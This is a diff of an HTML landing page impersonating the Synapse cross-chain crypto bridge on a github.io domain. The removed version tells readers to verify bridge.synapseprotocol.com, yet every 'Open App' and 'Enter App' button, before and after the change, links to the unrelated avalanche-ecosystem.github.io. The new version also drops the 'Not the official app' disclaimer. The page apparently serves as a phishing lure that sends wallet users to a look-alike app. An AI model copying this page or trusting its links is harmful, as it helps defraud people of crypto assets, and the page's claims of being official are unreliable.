@@ -1,47 +1,129 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Synapse Bridge - Open App</title><meta name="description" content="synapse bridge guide: open the official Synapse app for cross-chain transfers, supported networks, wallet quotes, and domain checks.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://synapse-bridge-site.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Synapse Bridge - Open App"><meta property="og:description" content="synapse bridge guide: open the official Synapse app for cross-chain transfers, supported networks, wallet quotes, and domain checks.">
-<meta property="og:url" content="https://synapse-bridge-site.github.io/"><meta property="og:image" content="https://synapse-bridge-site.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Synapse Bridge - Open App"><meta name="twitter:description" content="synapse bridge guide: open the official Synapse app for cross-chain transfers, supported networks, wallet quotes, and domain checks."><meta name="twitter:image" content="https://synapse-bridge-site.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://synapse-bridge-site.github.io/#website", "url": "https://synapse-bridge-site.github.io/", "name": "Synapse"}, {"@type": "WebPage", "@id": "https://synapse-bridge-site.github.io/#webpage", "url": "https://synapse-bridge-site.github.io/", "name": "Synapse Bridge - Open App", "description": "synapse bridge guide: open the official Synapse app for cross-chain transfers, supported networks, wallet quotes, and domain checks.", "inLanguage": "en", "isPartOf": {"@id": "https://synapse-bridge-site.github.io/#website"}}, {"@type": "Organization", "@id": "https://synapse-bridge-site.github.io/#org", "name": "Synapse", "url": "https://synapse-bridge-site.github.io/", "logo": "https://synapse-bridge-site.github.io/og-cover.png", "sameAs": ["https://twitter.com/SynapseProtocol", "https://github.com/synapsecns", "https://defillama.com/protocol/synapse"]}, {"@type": "WebApplication", "@id": "https://synapse-bridge-site.github.io/#app", "name": "Synapse Bridge", "url": "https://synapse-bridge-site.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "synapse bridge guide: open the official Synapse app for cross-chain transfers, supported networks, wallet quotes, and domain checks.", "featureList": ["20+ supported chains", "EVM and non-EVM routes", "Wallet-confirmed transactions"], "isPartOf": {"@id": "https://synapse-bridge-site.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://synapse-bridge-site.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is Synapse Bridge used for?", "acceptedAnswer": {"@type": "Answer", "text": "Synapse Bridge is used to move supported assets between chains. Users choose an origin chain, destination chain, token, and amount, then receive a route quote to confirm from their wallet. It is a bridge and routing app, not a centralized exchange withdrawal page."}}, {"@type": "Question", "name": "Which chains does Synapse Bridge support?", "acceptedAnswer": {"@type": "Answer", "text": "The official docs describe support for 20+ EVM and non-EVM blockchains. Exact route availability depends on the token and chain pair selected in the live app, so users should not assume every asset is available between every two networks."}}, {"@type": "Question", "name": "How long does a Synapse Bridge transfer take?", "acceptedAnswer": {"@type": "Answer", "text": "Timing depends on the route type, chain congestion, confirmations, liquidity, and destination chain conditions. The app quote and status tools should be treated as the current source. For large transfers, a small test bridge can reduce operational risk."}}, {"@type": "Question", "name": "Why did my Synapse Bridge output token look different?", "acceptedAnswer": {"@type": "Answer", "text": "Bridge routes can involve canonical assets, liquidity pool conversions, or CCTP for supported USDC routes. The destination token can differ by chain and route, so always check the contract and token name shown in the quote before signing."}}, {"@type": "Question", "name": "How do I track a Synapse Bridge transaction?", "acceptedAnswer": {"@type": "Answer", "text": "Use the Synapse Explorer and the source-chain transaction hash. Confirm that the source transaction succeeded, then check the bridge status and destination chain. If the token does not appear in the wallet, add the verified destination token contract manually."}}, {"@type": "Question", "name": "Is Synapse Bridge only for stablecoins?", "acceptedAnswer": {"@type": "Answer", "text": "No. Synapse supports multiple bridge functions and assets, including routes involving stablecoins and ETH-like assets such as nUSD and nETH pools. The live app determines which assets are currently available for the chosen chain pair."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Synapse"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Synapse</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Synapse Bridge</h1>
-      <div class="bridge-widget" role="group" aria-label="Synapse preview"><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>USDC</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>USDC</b> · Arbitrum</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"><img src="static/net-arbitrum.png" alt="Arbitrum" loading="lazy"><img src="static/net-optimism.png" alt="Optimism" loading="lazy"><img src="static/net-avalanche.png" alt="Avalanche" loading="lazy"><img src="static/net-bnb.png" alt="BNB Chain" loading="lazy"><img src="static/net-polygon.png" alt="Polygon" loading="lazy"><img src="static/net-base.png" alt="Base" loading="lazy"></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Synapse ↗</a></div>
-      <p class="hero-note">Live preview — open the official Synapse app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">20+ supported chains</span><span class="trust-chip">EVM and non-EVM routes</span><span class="trust-chip">Wallet-confirmed transactions</span></div>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Synapse Bridge</title>
+  <meta name="description" content="Synapse Bridge moves assets across chains from your own wallet through Synapse Protocol.">
+  <link rel="canonical" href="https://synapse-bridge-site.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#09060F">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Synapse Bridge">
+  <meta property="og:description" content="Synapse Bridge moves assets across chains from your own wallet through Synapse Protocol.">
+  <meta property="og:url" content="https://synapse-bridge-site.github.io/">
+  <meta property="og:image" content="https://synapse-bridge-site.github.io/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Synapse Bridge">
+  <meta name="twitter:description" content="Synapse Bridge moves assets across chains from your own wallet through Synapse Protocol.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://synapse-bridge-site.github.io/#website",
+        "url": "https://synapse-bridge-site.github.io/",
+        "name": "Synapse Bridge",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://synapse-bridge-site.github.io/#organization",
+        "name": "Synapse Protocol",
+        "url": "https://www.synapseprotocol.com/",
+        "logo": "https://synapse-bridge-site.github.io/favicon.png",
+        "sameAs": [
+          "https://www.synapseprotocol.com/",
+          "https://docs.synapseprotocol.com/",
+          "https://github.com/synapsecns",
+          "https://twitter.com/SynapseProtocol"
+        ]
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://synapse-bridge-site.github.io/#app",
+        "name": "Synapse Bridge",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://synapse-bridge-site.github.io/",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        }
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand" aria-label="Synapse Protocol">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Synapse Protocol</span>
     </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Synapse Bridge?</h2><div class="capsule"><strong>Synapse</strong> is an interoperability protocol and asset-transfer app for routing tokens between supported chains; the official docs describe support for <a href="https://docs.synapseprotocol.com/docs/Bridge/">20+ EVM and non-EVM blockchains</a>. Use the app only after checking the domain and wallet prompt.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Synapse Bridge at a glance</h2><div class="facts"><div class="f"><small>Category</small><b><a class="inline-link" href="https://academy.binance.com/en/glossary/cross-chain-bridge" rel="noopener noreferrer">Cross-chain bridge</a></b></div><div class="f"><small>Network</small><b>20+ EVM and non-EVM chains</b></div><div class="f"><small>Token</small><b>USDC, ETH, <a class="inline-link" href="https://www.coingecko.com/en/coins/nexus-usd" rel="noopener noreferrer">nUSD, nETH</a> and supported assets</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://contracts.synapseprotocol.com/bridge/synapsebridge" rel="noopener noreferrer">Bridge contracts</a></b></div><div class="f"><small>Explorer</small><b>explorer.synapseprotocol.com</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Synapse Bridge supported networks and routes</h2><div class="intent-a">Synapse Bridge supports asset transfers across 20+ EVM and non-EVM blockchains according to the official bridge docs. Route availability is not universal for every token and chain pair; it depends on selected origin chain, destination chain, token, liquidity, and bridge function. The docs describe canonical routes, <a class="inline-link" href="https://www.investopedia.com/terms/l/liquidity_pool.asp" rel="noopener noreferrer">liquidity pool routes</a>, and <a class="inline-link" href="https://www.circle.com/en/cross-chain-transfer-protocol" rel="noopener noreferrer">CCTP</a> for native USDC routing where available. A user should treat the live app quote as the current source for what can be bridged right now. The search-intent answer is: Synapse is broad, but supported networks and assets are route-specific, so choose both chains and the token before assuming liquidity or final output.</div></div></section><section class="section"><div class="container"><h2>Synapse Bridge fees speed and <a class="inline-link" href="https://www.investopedia.com/terms/s/slippage.asp" rel="noopener noreferrer">slippage</a></h2><div class="intent-a">Synapse Bridge fees and speed vary by route, asset, source chain, destination chain, and network conditions. A bridge quote can include source-chain gas, destination-chain effects, bridge or liquidity costs, and slippage if a liquidity pool route converts through nUSD or nETH. Some routes may be faster than others because canonical bridge mechanics, liquidity pool depth, or CCTP settlement differ. The practical action is to review the app quote, output amount, destination token, estimated time, and wallet prompt before signing. For high-value transfers, bridge a small test amount first and verify the destination wallet and chain.</div></div></section><section class="section section-alt"><div class="container"><h2>Synapse Bridge USDC and CCTP routes</h2><div class="intent-a">Synapse Bridge docs list CCTP as a bridge function for native USDC routes. CCTP routes differ from liquidity-pool routes because they rely on Circle's cross-chain USDC burn-and-mint system where supported, while other Synapse routes can use canonical assets or liquidity pools. A user searching Synapse USDC bridge usually wants to know whether they will receive native USDC, a bridged representation, or a pool-routed asset. The live quote should answer that for the selected chain pair. Always check token symbol, contract, and destination chain because stablecoin names can look similar while representing different contracts or bridge origins.</div></div></section><section class="section"><div class="container"><h2>Synapse Bridge transaction status and explorer</h2><div class="intent-a">Synapse provides an explorer for bridge, swap, and messaging activity. If a bridge looks stuck, first copy the source-chain <a class="inline-link" href="https://ethereum.org/en/developers/docs/apis/json-rpc/" rel="noopener noreferrer">transaction hash</a> and search it in the Synapse Explorer or the origin chain's <a class="inline-link" href="https://etherscan.io/explainer/what-is-a-block-explorer" rel="noopener noreferrer">block explorer</a>. Bridge status can be pending, confirmed, delayed, or affected by route-specific settlement conditions. Do not send another transaction just because a wallet balance has not updated immediately. Check whether the source transaction succeeded, whether the app shows a pending bridge, whether the destination token contract is visible in the wallet, and whether the destination chain requires adding the token manually.</div></div></section>
-  <section class="section"><div class="container"><h2>How to bridge Synapse Bridge</h2><ol class="steps"><li><b>Open the app</b><span>Go to bridge.synapseprotocol.com and connect your wallet only after verifying the URL.</span></li><li><b>Choose the route</b><span>Select the <a class="inline-link" href="https://www.coinbase.com/learn/crypto-basics/what-is-a-blockchain-bridge" rel="noopener noreferrer">origin chain</a>, destination chain, token, and amount you want to send.</span></li><li><b>Review the quote</b><span>Check the output token, route details, slippage, and required network before signing.</span></li><li><b>Confirm and track</b><span>Approve the token only if needed, sign in your wallet, then track status in the app or explorer.</span></li></ol><div class="cta-band"><div><p>Ready to bridge?</p><p class="sub">Open the official Synapse app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Synapse ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Synapse Bridge vs other bridges</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Synapse Bridge</th><th>Alternative bridge</th></tr></thead><tbody><tr><td>Route types</td><td>Canonical, liquidity pool, and CCTP routes</td><td>May use canonical, <a class="inline-link" href="https://www.bankless.com/the-rise-of-cross-chain-intents" rel="noopener noreferrer">intent</a>, liquidity, or messaging routes</td></tr><tr><td>Coverage</td><td>20+ EVM and non-EVM chains in docs</td><td>Coverage varies by product and token</td></tr><tr><td>Status tooling</td><td>Synapse Explorer for transaction lookup</td><td>Explorer support varies by bridge</td></tr><tr><td>Decision point</td><td>Output token, liquidity, cost, speed, chain pair</td><td>Same factors plus bridge-specific trust assumptions</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Synapse Bridge FAQ</h2><div class="faq-list"><details open><summary><h3>What is Synapse Bridge used for?</h3></summary><div>Synapse Bridge is used to move supported assets between chains. Users choose an origin chain, destination chain, token, and amount, then receive a route quote to confirm from their wallet. It is a bridge and routing app, not a <a class="inline-link" href="https://www.cmegroup.com/education/courses/introduction-to-cryptocurrency/what-is-a-cryptocurrency-exchange.html" rel="noopener noreferrer">centralized exchange</a> withdrawal page.</div></details><details><summary><h3>Which chains does Synapse Bridge support?</h3></summary><div>The official docs describe support for 20+ EVM and non-EVM blockchains. Exact route availability depends on the token and chain pair selected in the live app, so users should not assume every asset is available between every two networks.</div></details><details><summary><h3>How long does a Synapse Bridge transfer take?</h3></summary><div>Timing depends on the route type, chain congestion, confirmations, liquidity, and destination chain conditions. The app quote and status tools should be treated as the current source. For large transfers, a small test bridge can reduce operational risk.</div></details><details><summary><h3>Why did my Synapse Bridge output token look different?</h3></summary><div>Bridge routes can involve canonical assets, liquidity pool conversions, or CCTP for supported USDC routes. The destination token can differ by chain and route, so always check the contract and token name shown in the quote before signing.</div></details><details><summary><h3>How do I track a Synapse Bridge transaction?</h3></summary><div>Use the Synapse Explorer and the source-chain transaction hash. Confirm that the source transaction succeeded, then check the bridge status and destination chain. If the token does not appear in the wallet, add the verified destination token contract manually.</div></details><details><summary><h3>Is Synapse Bridge only for stablecoins?</h3></summary><div>No. Synapse supports multiple bridge functions and assets, including routes involving stablecoins and ETH-like assets such as nUSD and nETH pools. The live app determines which assets are currently available for the chosen chain pair.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">Not the official app; verify bridge.synapseprotocol.com before connecting a wallet. Educational content only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum Bridges</a>
+      <a href="https://docs.synapseprotocol.com/" target="_blank" rel="nofollow noopener noreferrer">Synapse Docs</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Synapse Bridge</h1>
+      <p class="value"><strong>Synapse Bridge</strong> moves assets across chains from your own wallet through Synapse Protocol.</p>
+    </section>
+
+    <section class="app-card" aria-label="Bridge preview">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
+          <span aria-hidden="true">&rarr;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img src="usdc.png" width="28" height="28" alt="USDC">
+            <span>USDC</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+      <p class="note">Preview only</p>
+    </section>
+  </main>
+
+  <footer class="footer">Synapse Bridge &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length < 2) return;
+
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  }());
+  </script>
+</body>
+</html>
